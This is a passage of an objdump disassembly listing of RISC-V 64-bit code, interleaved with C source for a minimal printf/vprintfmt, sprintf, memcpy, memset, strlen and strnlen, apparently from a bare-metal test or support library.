    80001ff8:	fcf71ae3          	bne	a4,a5,80001fcc <vprintfmt+0x1e>
    }
    fmt++;
    80001ffc:	f9843783          	ld	a5,-104(s0)
    80002000:	0785                	addi	a5,a5,1
    80002002:	f8f43c23          	sd	a5,-104(s0)

    // Process a %-escape sequence
    last_fmt = fmt;
    80002006:	f9843783          	ld	a5,-104(s0)
    8000200a:	faf43c23          	sd	a5,-72(s0)
    padc = ' ';
    8000200e:	02000793          	li	a5,32
    80002012:	fcf403a3          	sb	a5,-57(s0)
    width = -1;
    80002016:	57fd                	li	a5,-1
    80002018:	fcf42623          	sw	a5,-52(s0)
    precision = -1;
    8000201c:	57fd                	li	a5,-1
    8000201e:	fcf42423          	sw	a5,-56(s0)
    lflag = 0;
    80002022:	fc042823          	sw	zero,-48(s0)
    altflag = 0;
    80002026:	fa042a23          	sw	zero,-76(s0)
  reswitch:
    switch (ch = *(unsigned char *) fmt++) {
    8000202a:	f9843783          	ld	a5,-104(s0)
    8000202e:	00178713          	addi	a4,a5,1
    80002032:	f8e43c23          	sd	a4,-104(s0)
    80002036:	0007c783          	lbu	a5,0(a5)
    8000203a:	0007849b          	sext.w	s1,a5
    8000203e:	fdd4869b          	addiw	a3,s1,-35
    80002042:	0006871b          	sext.w	a4,a3
    80002046:	05500793          	li	a5,85
    8000204a:	28e7ed63          	bltu	a5,a4,800022e4 <vprintfmt+0x336>
    8000204e:	02069793          	slli	a5,a3,0x20
    80002052:	9381                	srli	a5,a5,0x20
    80002054:	00279713          	slli	a4,a5,0x2
    80002058:	00001797          	auipc	a5,0x1
    8000205c:	96878793          	addi	a5,a5,-1688 # 800029c0 <atol+0x28c>
    80002060:	97ba                	add	a5,a5,a4
    80002062:	439c                	lw	a5,0(a5)
    80002064:	0007871b          	sext.w	a4,a5
    80002068:	00001797          	auipc	a5,0x1
    8000206c:	95878793          	addi	a5,a5,-1704 # 800029c0 <atol+0x28c>
    80002070:	97ba                	add	a5,a5,a4
    80002072:	8782                	jr	a5

    // flag to pad on the right
    case '-':
      padc = '-';
    80002074:	02d00793          	li	a5,45
    80002078:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    8000207c:	b77d                	j	8000202a <vprintfmt+0x7c>
      
    // flag to pad with 0's instead of spaces
    case '0':
      padc = '0';
    8000207e:	03000793          	li	a5,48
    80002082:	fcf403a3          	sb	a5,-57(s0)
      goto reswitch;
    80002086:	b755                	j	8000202a <vprintfmt+0x7c>
    case '5':
    case '6':
    case '7':
    case '8':
    case '9':
      for (precision = 0; ; ++fmt) {
    80002088:	fc042423          	sw	zero,-56(s0)
        precision = precision * 10 + ch - '0';
    8000208c:	fc842703          	lw	a4,-56(s0)
    80002090:	87ba                	mv	a5,a4
    80002092:	0027979b          	slliw	a5,a5,0x2
    80002096:	9fb9                	addw	a5,a5,a4
    80002098:	0017979b          	slliw	a5,a5,0x1
    8000209c:	2781                	sext.w	a5,a5
    8000209e:	9fa5                	addw	a5,a5,s1
    800020a0:	2781                	sext.w	a5,a5
    800020a2:	fd07879b          	addiw	a5,a5,-48
    800020a6:	fcf42423          	sw	a5,-56(s0)
        ch = *fmt;
    800020aa:	f9843783          	ld	a5,-104(s0)
    800020ae:	0007c783          	lbu	a5,0(a5)
    800020b2:	0007849b          	sext.w	s1,a5
        if (ch < '0' || ch > '9')
    800020b6:	8726                	mv	a4,s1
    800020b8:	02f00793          	li	a5,47
    800020bc:	04e7d363          	ble	a4,a5,80002102 <vprintfmt+0x154>
    800020c0:	8726                	mv	a4,s1
    800020c2:	03900793          	li	a5,57
    800020c6:	02e7ce63          	blt	a5,a4,80002102 <vprintfmt+0x154>
      for (precision = 0; ; ++fmt) {
    800020ca:	f9843783          	ld	a5,-104(s0)
    800020ce:	0785                	addi	a5,a5,1
    800020d0:	f8f43c23          	sd	a5,-104(s0)
        precision = precision * 10 + ch - '0';
    800020d4:	bf65                	j	8000208c <vprintfmt+0xde>
          break;
      }
      goto process_precision;

    case '*':
      precision = va_arg(ap, int);
    800020d6:	f9043783          	ld	a5,-112(s0)
    800020da:	00878713          	addi	a4,a5,8
    800020de:	f8e43823          	sd	a4,-112(s0)
    800020e2:	439c                	lw	a5,0(a5)
    800020e4:	fcf42423          	sw	a5,-56(s0)
      goto process_precision;
    800020e8:	a831                	j	80002104 <vprintfmt+0x156>

    case '.':
      if (width < 0)
    800020ea:	fcc42783          	lw	a5,-52(s0)
    800020ee:	2781                	sext.w	a5,a5
    800020f0:	f207dde3          	bgez	a5,8000202a <vprintfmt+0x7c>
        width = 0;
    800020f4:	fc042623          	sw	zero,-52(s0)
      goto reswitch;
    800020f8:	bf0d                	j	8000202a <vprintfmt+0x7c>

    case '#':
      altflag = 1;
    800020fa:	4785                	li	a5,1
    800020fc:	faf42a23          	sw	a5,-76(s0)
      goto reswitch;
    80002100:	b72d                	j	8000202a <vprintfmt+0x7c>
      goto process_precision;
    80002102:	0001                	nop

    process_precision:
      if (width < 0)
    80002104:	fcc42783          	lw	a5,-52(s0)
    80002108:	2781                	sext.w	a5,a5
    8000210a:	f207d0e3          	bgez	a5,8000202a <vprintfmt+0x7c>
        width = precision, precision = -1;
    8000210e:	fc842783          	lw	a5,-56(s0)
    80002112:	fcf42623          	sw	a5,-52(s0)
    80002116:	57fd                	li	a5,-1
    80002118:	fcf42423          	sw	a5,-56(s0)
      goto reswitch;
    8000211c:	b739                	j	8000202a <vprintfmt+0x7c>

    // long flag (doubled for long long)
    case 'l':
      lflag++;
    8000211e:	fd042783          	lw	a5,-48(s0)
    80002122:	2785                	addiw	a5,a5,1
    80002124:	fcf42823          	sw	a5,-48(s0)
      goto reswitch;
    80002128:	b709                	j	8000202a <vprintfmt+0x7c>

    // character
    case 'c':
      putch(va_arg(ap, int), putdat);
    8000212a:	f9043783          	ld	a5,-112(s0)
    8000212e:	00878713          	addi	a4,a5,8
    80002132:	f8e43823          	sd	a4,-112(s0)
    80002136:	439c                	lw	a5,0(a5)
    80002138:	fa843703          	ld	a4,-88(s0)
    8000213c:	fa043583          	ld	a1,-96(s0)
    80002140:	853e                	mv	a0,a5
    80002142:	9702                	jalr	a4
      break;
    80002144:	aa65                	j	800022fc <vprintfmt+0x34e>

    // string
    case 's':
      if ((p = va_arg(ap, char *)) == NULL)
    80002146:	f9043783          	ld	a5,-112(s0)
    8000214a:	00878713          	addi	a4,a5,8
    8000214e:	f8e43823          	sd	a4,-112(s0)
    80002152:	0007b903          	ld	s2,0(a5)
    80002156:	00091663          	bnez	s2,80002162 <vprintfmt+0x1b4>
        p = "(null)";
    8000215a:	00001917          	auipc	s2,0x1
    8000215e:	85e90913          	addi	s2,s2,-1954 # 800029b8 <atol+0x284>
      if (width > 0 && padc != '-')
    80002162:	fcc42783          	lw	a5,-52(s0)
    80002166:	2781                	sext.w	a5,a5
    80002168:	06f05a63          	blez	a5,800021dc <vprintfmt+0x22e>
    8000216c:	fc744783          	lbu	a5,-57(s0)
    80002170:	0ff7f713          	andi	a4,a5,255
    80002174:	02d00793          	li	a5,45
    80002178:	06f70263          	beq	a4,a5,800021dc <vprintfmt+0x22e>
        for (width -= strnlen(p, precision); width > 0; width--)
    8000217c:	fcc42483          	lw	s1,-52(s0)
    80002180:	fc842783          	lw	a5,-56(s0)
    80002184:	85be                	mv	a1,a5
    80002186:	854a                	mv	a0,s2
    80002188:	4a4000ef          	jal	ra,8000262c <strnlen>
    8000218c:	87aa                	mv	a5,a0
    8000218e:	2781                	sext.w	a5,a5
    80002190:	40f487bb          	subw	a5,s1,a5
    80002194:	2781                	sext.w	a5,a5
    80002196:	fcf42623          	sw	a5,-52(s0)
    8000219a:	a839                	j	800021b8 <vprintfmt+0x20a>
          putch(padc, putdat);
    8000219c:	fc744783          	lbu	a5,-57(s0)
    800021a0:	2781                	sext.w	a5,a5
    800021a2:	fa843703          	ld	a4,-88(s0)
    800021a6:	fa043583          	ld	a1,-96(s0)
    800021aa:	853e                	mv	a0,a5
    800021ac:	9702                	jalr	a4
        for (width -= strnlen(p, precision); width > 0; width--)
    800021ae:	fcc42783          	lw	a5,-52(s0)
    800021b2:	37fd                	addiw	a5,a5,-1
    800021b4:	fcf42623          	sw	a5,-52(s0)
    800021b8:	fcc42783          	lw	a5,-52(s0)
    800021bc:	2781                	sext.w	a5,a5
    800021be:	fcf04fe3          	bgtz	a5,8000219c <vprintfmt+0x1ee>
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    800021c2:	a829                	j	800021dc <vprintfmt+0x22e>
        putch(ch, putdat);
    800021c4:	fa843783          	ld	a5,-88(s0)
    800021c8:	fa043583          	ld	a1,-96(s0)
    800021cc:	8526                	mv	a0,s1
    800021ce:	9782                	jalr	a5
        p++;
    800021d0:	0905                	addi	s2,s2,1
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    800021d2:	fcc42783          	lw	a5,-52(s0)
    800021d6:	37fd                	addiw	a5,a5,-1
    800021d8:	fcf42623          	sw	a5,-52(s0)
    800021dc:	00094783          	lbu	a5,0(s2)
    800021e0:	0007849b          	sext.w	s1,a5
    800021e4:	cc8d                	beqz	s1,8000221e <vprintfmt+0x270>
    800021e6:	fc842783          	lw	a5,-56(s0)
    800021ea:	2781                	sext.w	a5,a5
    800021ec:	fc07cce3          	bltz	a5,800021c4 <vprintfmt+0x216>
    800021f0:	fc842783          	lw	a5,-56(s0)
    800021f4:	37fd                	addiw	a5,a5,-1
    800021f6:	fcf42423          	sw	a5,-56(s0)
    800021fa:	fc842783          	lw	a5,-56(s0)
    800021fe:	2781                	sext.w	a5,a5
    80002200:	fc07d2e3          	bgez	a5,800021c4 <vprintfmt+0x216>
      }
      for (; width > 0; width--)
    80002204:	a829                	j	8000221e <vprintfmt+0x270>
        putch(' ', putdat);
    80002206:	fa843783          	ld	a5,-88(s0)
    8000220a:	fa043583          	ld	a1,-96(s0)
    8000220e:	02000513          	li	a0,32
    80002212:	9782                	jalr	a5
      for (; width > 0; width--)
    80002214:	fcc42783          	lw	a5,-52(s0)
    80002218:	37fd                	addiw	a5,a5,-1
    8000221a:	fcf42623          	sw	a5,-52(s0)
    8000221e:	fcc42783          	lw	a5,-52(s0)
    80002222:	2781                	sext.w	a5,a5
    80002224:	fef041e3          	bgtz	a5,80002206 <vprintfmt+0x258>
      break;
    80002228:	a8d1                	j	800022fc <vprintfmt+0x34e>

    // (signed) decimal
    case 'd':
      num = getint(&ap, lflag);
    8000222a:	fd042703          	lw	a4,-48(s0)
    8000222e:	f9040793          	addi	a5,s0,-112
    80002232:	85ba                	mv	a1,a4
    80002234:	853e                	mv	a0,a5
    80002236:	d11ff0ef          	jal	ra,80001f46 <getint>
    8000223a:	87aa                	mv	a5,a0
    8000223c:	fcf43c23          	sd	a5,-40(s0)
      if ((long long) num < 0) {
    80002240:	fd843783          	ld	a5,-40(s0)
    80002244:	0007df63          	bgez	a5,80002262 <vprintfmt+0x2b4>
        putch('-', putdat);
    80002248:	fa843783          	ld	a5,-88(s0)
    8000224c:	fa043583          	ld	a1,-96(s0)
    80002250:	02d00513          	li	a0,45
    80002254:	9782                	jalr	a5
        num = -(long long) num;
    80002256:	fd843783          	ld	a5,-40(s0)
    8000225a:	40f007b3          	neg	a5,a5
    8000225e:	fcf43c23          	sd	a5,-40(s0)
      }
      base = 10;
    80002262:	47a9                	li	a5,10
    80002264:	fcf42a23          	sw	a5,-44(s0)
      goto signed_number;
    80002268:	a0b9                	j	800022b6 <vprintfmt+0x308>

    // unsigned decimal
    case 'u':
      base = 10;
    8000226a:	47a9                	li	a5,10
    8000226c:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80002270:	a80d                	j	800022a2 <vprintfmt+0x2f4>

    // (unsigned) octal
    case 'o':
      // should do something with padding so it's always 3 octits
      base = 8;
    80002272:	47a1                	li	a5,8
    80002274:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80002278:	a02d                	j	800022a2 <vprintfmt+0x2f4>

    // pointer
    case 'p':
      static_assert(sizeof(long) == sizeof(void*));
      lflag = 1;
    8000227a:	4785                	li	a5,1
    8000227c:	fcf42823          	sw	a5,-48(s0)
      putch('0', putdat);
    80002280:	fa843783          	ld	a5,-88(s0)
    80002284:	fa043583          	ld	a1,-96(s0)
    80002288:	03000513          	li	a0,48
    8000228c:	9782                	jalr	a5
      putch('x', putdat);
    8000228e:	fa843783          	ld	a5,-88(s0)
    80002292:	fa043583          	ld	a1,-96(s0)
    80002296:	07800513          	li	a0,120
    8000229a:	9782                	jalr	a5
      /* fall through to 'x' */

    // (unsigned) hexadecimal
    case 'x':
      base = 16;
    8000229c:	47c1                	li	a5,16
    8000229e:	fcf42a23          	sw	a5,-44(s0)
    unsigned_number:
      num = getuint(&ap, lflag);
    800022a2:	fd042703          	lw	a4,-48(s0)
    800022a6:	f9040793          	addi	a5,s0,-112
    800022aa:	85ba                	mv	a1,a4
    800022ac:	853e                	mv	a0,a5
    800022ae:	c2dff0ef          	jal	ra,80001eda <getuint>
    800022b2:	fca43c23          	sd	a0,-40(s0)
    signed_number:
      printnum(putch, putdat, num, base, width, padc);
    800022b6:	fd442683          	lw	a3,-44(s0)
    800022ba:	fc744783          	lbu	a5,-57(s0)
    800022be:	2781                	sext.w	a5,a5
    800022c0:	fcc42703          	lw	a4,-52(s0)
    800022c4:	fd843603          	ld	a2,-40(s0)
    800022c8:	fa043583          	ld	a1,-96(s0)
    800022cc:	fa843503          	ld	a0,-88(s0)
    800022d0:	b09ff0ef          	jal	ra,80001dd8 <printnum>
      break;
    800022d4:	a025                	j	800022fc <vprintfmt+0x34e>

    // escaped '%' character
    case '%':
      putch(ch, putdat);
    800022d6:	fa843783          	ld	a5,-88(s0)
    800022da:	fa043583          	ld	a1,-96(s0)
    800022de:	8526                	mv	a0,s1
    800022e0:	9782                	jalr	a5
      break;
    800022e2:	a829                	j	800022fc <vprintfmt+0x34e>
      
    // unrecognized escape sequence - just print it literally
    default:
      putch('%', putdat);
    800022e4:	fa843783          	ld	a5,-88(s0)
    800022e8:	fa043583          	ld	a1,-96(s0)
    800022ec:	02500513          	li	a0,37
    800022f0:	9782                	jalr	a5
      fmt = last_fmt;
    800022f2:	fb843783          	ld	a5,-72(s0)
    800022f6:	f8f43c23          	sd	a5,-104(s0)
      break;
    800022fa:	0001                	nop
    while ((ch = *(unsigned char *) fmt) != '%') {
    800022fc:	b1ed                	j	80001fe6 <vprintfmt+0x38>
        return;
    800022fe:	0001                	nop
    }
  }
}
    80002300:	70a6                	ld	ra,104(sp)
    80002302:	7406                	ld	s0,96(sp)
    80002304:	64e6                	ld	s1,88(sp)
    80002306:	6946                	ld	s2,80(sp)
    80002308:	6165                	addi	sp,sp,112
    8000230a:	8082                	ret

000000008000230c <printf>:

int printf(const char* fmt, ...)
{
    8000230c:	7159                	addi	sp,sp,-112
    8000230e:	f406                	sd	ra,40(sp)
    80002310:	f022                	sd	s0,32(sp)
    80002312:	1800                	addi	s0,sp,48
    80002314:	fca43c23          	sd	a0,-40(s0)
    80002318:	e40c                	sd	a1,8(s0)
    8000231a:	e810                	sd	a2,16(s0)
    8000231c:	ec14                	sd	a3,24(s0)
    8000231e:	f018                	sd	a4,32(s0)
    80002320:	f41c                	sd	a5,40(s0)
    80002322:	03043823          	sd	a6,48(s0)
    80002326:	03143c23          	sd	a7,56(s0)
  va_list ap;
  va_start(ap, fmt);
    8000232a:	04040793          	addi	a5,s0,64
    8000232e:	fcf43823          	sd	a5,-48(s0)
    80002332:	fd043783          	ld	a5,-48(s0)
    80002336:	fc878793          	addi	a5,a5,-56
    8000233a:	fef43423          	sd	a5,-24(s0)

  vprintfmt((void*)putchar, 0, fmt, ap);
    8000233e:	fe843783          	ld	a5,-24(s0)
    80002342:	86be                	mv	a3,a5
    80002344:	fd843603          	ld	a2,-40(s0)
    80002348:	4581                	li	a1,0
    8000234a:	00000517          	auipc	a0,0x0
    8000234e:	98e50513          	addi	a0,a0,-1650 # 80001cd8 <putchar>
    80002352:	c5dff0ef          	jal	ra,80001fae <vprintfmt>

  va_end(ap);
  return 0; // incorrect return value, but who cares, anyway?
    80002356:	4781                	li	a5,0
}
    80002358:	853e                	mv	a0,a5
    8000235a:	70a2                	ld	ra,40(sp)
    8000235c:	7402                	ld	s0,32(sp)
    8000235e:	6165                	addi	sp,sp,112
    80002360:	8082                	ret

0000000080002362 <sprintf_putch.3105>:
  va_list ap;
  char* str0 = str;
  va_start(ap, fmt);

  void sprintf_putch(int ch, void** data)
  {
    80002362:	7139                	addi	sp,sp,-64
    80002364:	fc22                	sd	s0,56(sp)
    80002366:	0080                	addi	s0,sp,64
    80002368:	87aa                	mv	a5,a0
    8000236a:	fcb43823          	sd	a1,-48(s0)
    8000236e:	fcf42e23          	sw	a5,-36(s0)
    80002372:	fc743423          	sd	t2,-56(s0)
    char** pstr = (char**)data;
    80002376:	fd043783          	ld	a5,-48(s0)
    8000237a:	fef43423          	sd	a5,-24(s0)
    **pstr = ch;
    8000237e:	fe843783          	ld	a5,-24(s0)
    80002382:	639c                	ld	a5,0(a5)
    80002384:	fdc42703          	lw	a4,-36(s0)
    80002388:	0ff77713          	andi	a4,a4,255
    8000238c:	00e78023          	sb	a4,0(a5)
    (*pstr)++;
    80002390:	fe843783          	ld	a5,-24(s0)
    80002394:	639c                	ld	a5,0(a5)
    80002396:	00178713          	addi	a4,a5,1
    8000239a:	fe843783          	ld	a5,-24(s0)
    8000239e:	e398                	sd	a4,0(a5)
  }
    800023a0:	0001                	nop
    800023a2:	7462                	ld	s0,56(sp)
    800023a4:	6121                	addi	sp,sp,64
    800023a6:	8082                	ret

00000000800023a8 <sprintf>:
{
    800023a8:	716d                	addi	sp,sp,-272
    800023aa:	ed86                	sd	ra,216(sp)
    800023ac:	e9a2                	sd	s0,208(sp)
    800023ae:	1180                	addi	s0,sp,224
    800023b0:	f2a43c23          	sd	a0,-200(s0)
    800023b4:	f2b43823          	sd	a1,-208(s0)
    800023b8:	e010                	sd	a2,0(s0)
    800023ba:	e414                	sd	a3,8(s0)
    800023bc:	e818                	sd	a4,16(s0)
    800023be:	ec1c                	sd	a5,24(s0)
    800023c0:	03043023          	sd	a6,32(s0)
    800023c4:	03143423          	sd	a7,40(s0)
int	feof (FILE *);
int	ferror (FILE *);
void    perror (const char *);
#ifndef _REENT_ONLY
FILE *	fopen (const char *__restrict _name, const char *__restrict _type);
int	sprintf (char *__restrict, const char *__restrict, ...)
    800023c8:	03040793          	addi	a5,s0,48
    800023cc:	f2f43423          	sd	a5,-216(s0)
    800023d0:	f2843783          	ld	a5,-216(s0)
    800023d4:	fcf43c23          	sd	a5,-40(s0)
    800023d8:	f4840793          	addi	a5,s0,-184
    800023dc:	f4840713          	addi	a4,s0,-184
    800023e0:	39700693          	li	a3,919
    800023e4:	c394                	sw	a3,0(a5)
    800023e6:	0183b6b7          	lui	a3,0x183b
    800023ea:	30368693          	addi	a3,a3,771 # 183b303 <_tbss_end+0x183b27f>
    800023ee:	c3d4                	sw	a3,4(a5)
    800023f0:	0103b6b7          	lui	a3,0x103b
    800023f4:	38368693          	addi	a3,a3,899 # 103b383 <_tbss_end+0x103b2ff>
    800023f8:	c794                	sw	a3,8(a5)
    800023fa:	000306b7          	lui	a3,0x30
    800023fe:	06768693          	addi	a3,a3,103 # 30067 <_tbss_end+0x2ffe3>
    80002402:	c7d4                	sw	a3,12(a5)
    80002404:	eb98                	sd	a4,16(a5)
    80002406:	00000717          	auipc	a4,0x0
    8000240a:	f5c70713          	addi	a4,a4,-164 # 80002362 <sprintf_putch.3105>
    8000240e:	ef98                	sd	a4,24(a5)
    80002410:	0000100f          	fence.i
  char* str0 = str;
    80002414:	f3843783          	ld	a5,-200(s0)
    80002418:	fef43423          	sd	a5,-24(s0)
  va_start(ap, fmt);
    8000241c:	03040793          	addi	a5,s0,48
    80002420:	f2f43423          	sd	a5,-216(s0)
    80002424:	f2843783          	ld	a5,-216(s0)
    80002428:	fd078793          	addi	a5,a5,-48
    8000242c:	fef43023          	sd	a5,-32(s0)

  vprintfmt(sprintf_putch, (void**)&str, fmt, ap);
    80002430:	fe043703          	ld	a4,-32(s0)
    80002434:	f4840793          	addi	a5,s0,-184
    80002438:	853e                	mv	a0,a5
    8000243a:	f3840793          	addi	a5,s0,-200
    8000243e:	86ba                	mv	a3,a4
    80002440:	f3043603          	ld	a2,-208(s0)
    80002444:	85be                	mv	a1,a5
    80002446:	b69ff0ef          	jal	ra,80001fae <vprintfmt>
  *str = 0;
    8000244a:	f3843783          	ld	a5,-200(s0)
    8000244e:	00078023          	sb	zero,0(a5)

  va_end(ap);
  return str - str0;
    80002452:	f3843703          	ld	a4,-200(s0)
    80002456:	fe843783          	ld	a5,-24(s0)
    8000245a:	40f707b3          	sub	a5,a4,a5
    8000245e:	2781                	sext.w	a5,a5
}
    80002460:	853e                	mv	a0,a5
    80002462:	60ee                	ld	ra,216(sp)
    80002464:	644e                	ld	s0,208(sp)
    80002466:	6151                	addi	sp,sp,272
    80002468:	8082                	ret

000000008000246a <memcpy>:

void* memcpy(void* dest, const void* src, size_t len)
{
    8000246a:	715d                	addi	sp,sp,-80
    8000246c:	e4a2                	sd	s0,72(sp)
    8000246e:	0880                	addi	s0,sp,80
    80002470:	fca43423          	sd	a0,-56(s0)
    80002474:	fcb43023          	sd	a1,-64(s0)
    80002478:	fac43c23          	sd	a2,-72(s0)
  if ((((uintptr_t)dest | (uintptr_t)src | len) & (sizeof(uintptr_t)-1)) == 0) {
    8000247c:	fc843703          	ld	a4,-56(s0)
    80002480:	fc043783          	ld	a5,-64(s0)
    80002484:	8f5d                	or	a4,a4,a5
    80002486:	fb843783          	ld	a5,-72(s0)
    8000248a:	8fd9                	or	a5,a5,a4
    8000248c:	8b9d                	andi	a5,a5,7
    8000248e:	e3b1                	bnez	a5,800024d2 <memcpy+0x68>
    const uintptr_t* s = src;
    80002490:	fc043783          	ld	a5,-64(s0)
    80002494:	fef43423          	sd	a5,-24(s0)
    uintptr_t *d = dest;
    80002498:	fc843783          	ld	a5,-56(s0)
    8000249c:	fef43023          	sd	a5,-32(s0)
    while (d < (uintptr_t*)(dest + len))
    800024a0:	a839                	j	800024be <memcpy+0x54>
      *d++ = *s++;
    800024a2:	fe843703          	ld	a4,-24(s0)
    800024a6:	00870793          	addi	a5,a4,8
    800024aa:	fef43423          	sd	a5,-24(s0)
    800024ae:	fe043783          	ld	a5,-32(s0)
    800024b2:	00878693          	addi	a3,a5,8
    800024b6:	fed43023          	sd	a3,-32(s0)
    800024ba:	6318                	ld	a4,0(a4)
    800024bc:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    800024be:	fc843703          	ld	a4,-56(s0)
    800024c2:	fb843783          	ld	a5,-72(s0)
    800024c6:	97ba                	add	a5,a5,a4
    800024c8:	fe043703          	ld	a4,-32(s0)
    800024cc:	fcf76be3          	bltu	a4,a5,800024a2 <memcpy+0x38>
    800024d0:	a099                	j	80002516 <memcpy+0xac>
  } else {
    const char* s = src;
    800024d2:	fc043783          	ld	a5,-64(s0)
    800024d6:	fcf43c23          	sd	a5,-40(s0)
    char *d = dest;
    800024da:	fc843783          	ld	a5,-56(s0)
    800024de:	fcf43823          	sd	a5,-48(s0)
    while (d < (char*)(dest + len))
    800024e2:	a00d                	j	80002504 <memcpy+0x9a>
      *d++ = *s++;
    800024e4:	fd843703          	ld	a4,-40(s0)
    800024e8:	00170793          	addi	a5,a4,1
    800024ec:	fcf43c23          	sd	a5,-40(s0)
    800024f0:	fd043783          	ld	a5,-48(s0)
    800024f4:	00178693          	addi	a3,a5,1
    800024f8:	fcd43823          	sd	a3,-48(s0)
    800024fc:	00074703          	lbu	a4,0(a4)
    80002500:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    80002504:	fc843703          	ld	a4,-56(s0)
    80002508:	fb843783          	ld	a5,-72(s0)
    8000250c:	97ba                	add	a5,a5,a4
    8000250e:	fd043703          	ld	a4,-48(s0)
    80002512:	fcf769e3          	bltu	a4,a5,800024e4 <memcpy+0x7a>
  }
  return dest;
    80002516:	fc843783          	ld	a5,-56(s0)
}
    8000251a:	853e                	mv	a0,a5
    8000251c:	6426                	ld	s0,72(sp)
    8000251e:	6161                	addi	sp,sp,80
    80002520:	8082                	ret

0000000080002522 <memset>:

void* memset(void* dest, int byte, size_t len)
{
    80002522:	715d                	addi	sp,sp,-80
    80002524:	e4a2                	sd	s0,72(sp)
    80002526:	0880                	addi	s0,sp,80
    80002528:	fca43423          	sd	a0,-56(s0)
    8000252c:	87ae                	mv	a5,a1
    8000252e:	fac43c23          	sd	a2,-72(s0)
    80002532:	fcf42223          	sw	a5,-60(s0)
  if ((((uintptr_t)dest | len) & (sizeof(uintptr_t)-1)) == 0) {
    80002536:	fc843703          	ld	a4,-56(s0)
    8000253a:	fb843783          	ld	a5,-72(s0)
    8000253e:	8fd9                	or	a5,a5,a4
    80002540:	8b9d                	andi	a5,a5,7
    80002542:	e7bd                	bnez	a5,800025b0 <memset+0x8e>
    uintptr_t word = byte & 0xFF;
    80002544:	fc442783          	lw	a5,-60(s0)
    80002548:	0ff7f793          	andi	a5,a5,255
    8000254c:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 8;
    80002550:	fd843783          	ld	a5,-40(s0)
    80002554:	07a2                	slli	a5,a5,0x8
    80002556:	fd843703          	ld	a4,-40(s0)
    8000255a:	8fd9                	or	a5,a5,a4
    8000255c:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16;
    80002560:	fd843783          	ld	a5,-40(s0)
    80002564:	07c2                	slli	a5,a5,0x10
    80002566:	fd843703          	ld	a4,-40(s0)
    8000256a:	8fd9                	or	a5,a5,a4
    8000256c:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16 << 16;
    80002570:	fd843783          	ld	a5,-40(s0)
    80002574:	1782                	slli	a5,a5,0x20
    80002576:	fd843703          	ld	a4,-40(s0)
    8000257a:	8fd9                	or	a5,a5,a4
    8000257c:	fcf43c23          	sd	a5,-40(s0)

    uintptr_t *d = dest;
    80002580:	fc843783          	ld	a5,-56(s0)
    80002584:	fef43423          	sd	a5,-24(s0)
    while (d < (uintptr_t*)(dest + len))
    80002588:	a811                	j	8000259c <memset+0x7a>
      *d++ = word;
    8000258a:	fe843783          	ld	a5,-24(s0)
    8000258e:	00878713          	addi	a4,a5,8
    80002592:	fee43423          	sd	a4,-24(s0)
    80002596:	fd843703          	ld	a4,-40(s0)
    8000259a:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    8000259c:	fc843703          	ld	a4,-56(s0)
    800025a0:	fb843783          	ld	a5,-72(s0)
    800025a4:	97ba                	add	a5,a5,a4
    800025a6:	fe843703          	ld	a4,-24(s0)
    800025aa:	fef760e3          	bltu	a4,a5,8000258a <memset+0x68>
    800025ae:	a81d                	j	800025e4 <memset+0xc2>
  } else {
    char *d = dest;
    800025b0:	fc843783          	ld	a5,-56(s0)
    800025b4:	fef43023          	sd	a5,-32(s0)
    while (d < (char*)(dest + len))
    800025b8:	a829                	j	800025d2 <memset+0xb0>
      *d++ = byte;
    800025ba:	fe043783          	ld	a5,-32(s0)
    800025be:	00178713          	addi	a4,a5,1
    800025c2:	fee43023          	sd	a4,-32(s0)
    800025c6:	fc442703          	lw	a4,-60(s0)
    800025ca:	0ff77713          	andi	a4,a4,255
    800025ce:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    800025d2:	fc843703          	ld	a4,-56(s0)
    800025d6:	fb843783          	ld	a5,-72(s0)
    800025da:	97ba                	add	a5,a5,a4
    800025dc:	fe043703          	ld	a4,-32(s0)
    800025e0:	fcf76de3          	bltu	a4,a5,800025ba <memset+0x98>
  }
  return dest;
    800025e4:	fc843783          	ld	a5,-56(s0)
}
    800025e8:	853e                	mv	a0,a5
    800025ea:	6426                	ld	s0,72(sp)
    800025ec:	6161                	addi	sp,sp,80
    800025ee:	8082                	ret

00000000800025f0 <strlen>:

size_t strlen(const char *s)
{
    800025f0:	7179                	addi	sp,sp,-48
    800025f2:	f422                	sd	s0,40(sp)
    800025f4:	1800                	addi	s0,sp,48
    800025f6:	fca43c23          	sd	a0,-40(s0)
  const char *p = s;
    800025fa:	fd843783          	ld	a5,-40(s0)
    800025fe:	fef43423          	sd	a5,-24(s0)
  while (*p)
    80002602:	a031                	j	8000260e <strlen+0x1e>
    p++;
    80002604:	fe843783          	ld	a5,-24(s0)
    80002608:	0785                	addi	a5,a5,1
    8000260a:	fef43423          	sd	a5,-24(s0)
  while (*p)
    8000260e:	fe843783          	ld	a5,-24(s0)
    80002612:	0007c783          	lbu	a5,0(a5)
    80002616:	f7fd                	bnez	a5,80002604 <strlen+0x14>
  return p - s;
    80002618:	fe843703          	ld	a4,-24(s0)
    8000261c:	fd843783          	ld	a5,-40(s0)
    80002620:	40f707b3          	sub	a5,a4,a5
}
    80002624:	853e                	mv	a0,a5
    80002626:	7422                	ld	s0,40(sp)
    80002628:	6145                	addi	sp,sp,48
    8000262a:	8082                	ret

000000008000262c <strnlen>:

size_t strnlen(const char *s, size_t n)
{
    8000262c:	7179                	addi	sp,sp,-48
    8000262e:	f422                	sd	s0,40(sp)
    80002630:	1800                	addi	s0,sp,48
    80002632:	fca43c23          	sd	a0,-40(s0)
    80002636:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    8000263a:	fd843783          	ld	a5,-40(s0)
    8000263e:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    80002642:	a031                	j	8000264e <strnlen+0x22>
    p++;
    80002644:	fe843783          	ld	a5,-24(s0)
    80002648:	0785                	addi	a5,a5,1
    8000264a:	fef43423          	sd	a5,-24(s0)
